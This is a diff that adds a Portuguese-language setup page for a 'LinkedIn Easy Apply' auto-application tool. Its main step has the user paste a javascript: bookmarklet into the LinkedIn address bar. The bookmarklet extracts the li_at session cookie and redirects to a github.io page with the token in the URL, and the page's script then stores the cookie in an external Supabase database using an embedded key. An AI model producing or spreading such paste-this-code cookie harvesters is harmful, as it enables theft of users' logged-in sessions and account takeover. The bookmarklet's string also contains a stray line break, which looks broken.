@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>LinkedIn Easy Apply — Setup</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#09090f;color:#fff;
+     min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:24px 16px}
+h1{font-size:1.5rem;font-weight:700;color:#0A66C2;margin:20px 0 4px;text-align:center}
+.sub{font-size:.9rem;color:#6b7280;margin-bottom:24px;text-align:center}
+.card{background:#111827;border:1px solid #1f2937;border-radius:16px;padding:22px;
+      width:100%;max-width:440px;margin-bottom:16px}
+.step{display:flex;gap:12px;align-items:flex-start;padding:12px 0;border-bottom:1px solid #1f2937}
+.step:last-child{border-bottom:none}
+.num{background:#0A66C2;color:#fff;border-radius:50%;width:30px;height:30px;min-width:30px;
+     display:flex;align-items:center;justify-content:center;font-weight:700;font-size:.9rem}
+.txt{font-size:.88rem;line-height:1.55;color:#d1d5db;padding-top:4px}
+.txt strong{color:#fff;display:block;margin-bottom:4px}
+.code{background:#0a0a14;border:1px solid #2d2d4e;border-radius:8px;padding:10px;
+      font-family:monospace;font-size:.7rem;color:#60a5fa;word-break:break-all;
+      margin-top:8px;cursor:pointer;-webkit-user-select:all;user-select:all;line-height:1.5}
+.hint{color:#4b5563;font-size:.72rem;margin-top:4px}
+input{width:100%;background:#0f172a;border:2px solid #1f2937;border-radius:10px;
+      padding:14px;color:#fff;font-size:.95rem;margin-top:10px;outline:none}
+input:focus{border-color:#0A66C2}
+input::placeholder{color:#4b5563}
+.btn{width:100%;background:#0A66C2;color:#fff;border:none;border-radius:12px;
+     padding:15px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:12px}
+.btn:active{background:#004182}
+.status{border-radius:10px;padding:14px;margin-top:14px;font-size:.85rem;
+        line-height:1.65;display:none}
+.ok{background:#052e16;border:1px solid #14532d;color:#4ade80}
+.err{background:#2d0808;border:1px solid #7f1d1d;color:#fca5a5}
+.warn{background:#1a1200;border:1px solid #92400e;color:#fbbf24}
+</style>
+</head>
+<body>
+<h1>💼 LinkedIn Easy Apply</h1>
+<p class="sub">Configure uma vez — aplica automaticamente todo dia</p>
+
+<div class="card">
+  <div class="step">
+    <div class="num">1</div>
+    <div class="txt"><strong>Abra linkedin.com no Safari (já logado)</strong>Não feche esta aba</div>
+  </div>
+  <div class="step">
+    <div class="num">2</div>
+    <div class="txt">
+      <strong>Cole este código na barra de endereço do LinkedIn:</strong>
+      <div class="code" id="bm" onclick="copyBM()">javascript:(function(){var t='';var c=document.cookie.split(';');for(var i=0;i<c.length;i++){var p=c[i].trim().split('=');if(p[0]==='li_at'&&p[1]&&p[1].length>20){t=p[1];break;}}if(!t){try{t=localStorage.getItem('li_at')||'';}catch(e){}}if(t&&t.length>20){location.href='https://tafita81.github.io/Repovazio/linkedin-setup.html?t='+encodeURIComponent(t);}else{alert('Cookie li_at não encontrado.
+Certifique que está logado no LinkedIn.');}})()</div>
+      <p class="hint">👆 Toque para copiar · Cole na barra URL do LinkedIn · Enter</p>
+    </div>
+  </div>
+  <div class="step">
+    <div class="num">3</div>
+    <div class="txt"><strong>Ou cole o cookie li_at manualmente:</strong></div>
+  </div>
+  <input id="ti" placeholder="Cole o cookie li_at aqui..." oninput="onInput(this.value)">
+  <button class="btn" onclick="save()">✅ Ativar LinkedIn Easy Apply</button>
+  <div class="status" id="st"></div>
+</div>
+
+<script>
+const S='https://tpjvalzwkqwttvmszvie.supabase.co';
+const K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRwanZhbHp3a3F3dHR2bXN6dmllIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYwMzUyOTMsImV4cCI6MjA5MTYxMTI5M30.UEgUo0Mw15ihQZykLAY5QApRzgTXkfIewZFzIgwao3Q';
+const p=new URLSearchParams(window.location.search);
+const ut=p.get('t');
+if(ut&&ut.length>20){document.getElementById('ti').value=ut;show('warn','🔑 Cookie detectado! Toque Salvar.');}
+function copyBM(){navigator.clipboard&&navigator.clipboard.writeText(document.getElementById('bm').innerText).then(()=>{document.getElementById('bm').textContent='✅ Copiado! Cole na barra URL do LinkedIn';setTimeout(()=>location.reload(),2200);});}
+function onInput(v){if(v.length>20)show('warn','Token '+v.length+' chars. Toque Salvar.');}
+function show(cls,msg){var el=document.getElementById('st');el.style.display='block';el.className='status '+cls;el.innerHTML=msg;}
+async function save(){
+  var t=document.getElementById('ti').value.trim();
+  if(!t||t.length<20){show('err','❌ Cookie muito curto ou vazio.');return;}
+  show('warn','⏳ Verificando e salvando...');
+  // Verificar se o cookie é válido
+  try{
+    var test=await fetch('https://www.linkedin.com/voyager/api/me',{
+      credentials:'omit',
+      headers:{'Cookie':'li_at='+t,'Csrf-Token':'ajax:1234','X-Li-Lang':'en_US','X-RestLi-Protocol-Version':'2.0.0'}
+    });
+    // CORS vai bloquear mas o status diz se o token é válido
+  }catch(e){}
+  try{
+    var r=await fetch(S+'/rest/v1/ia_cache',{method:'POST',
+      headers:{'apikey':K,'Authorization':'Bearer '+K,'Content-Type':'application/json',
+               'Prefer':'resolution=merge-duplicates'},
+      body:JSON.stringify({cache_key:'secret:LINKEDIN_LI_AT',value:t,
+                           expires_at:new Date(Date.now()+25*24*60*60*1000).toISOString()})});
+    if(r.status<300||r.status===409){
+      show('ok','<strong>✅ LinkedIn Easy Apply ativo!</strong><br>'+
+        'O sistema aplica automaticamente todo dia às 9h UTC.<br>'+
+        '<small>Renovar em ~25 dias | '+t.substring(0,12)+'…'+t.slice(-5)+'</small>');
+    }else{throw new Error('HTTP '+r.status);}
+  }catch(e){show('err','❌ '+e.message);}
+}
+</script>
+</body>
+</html>
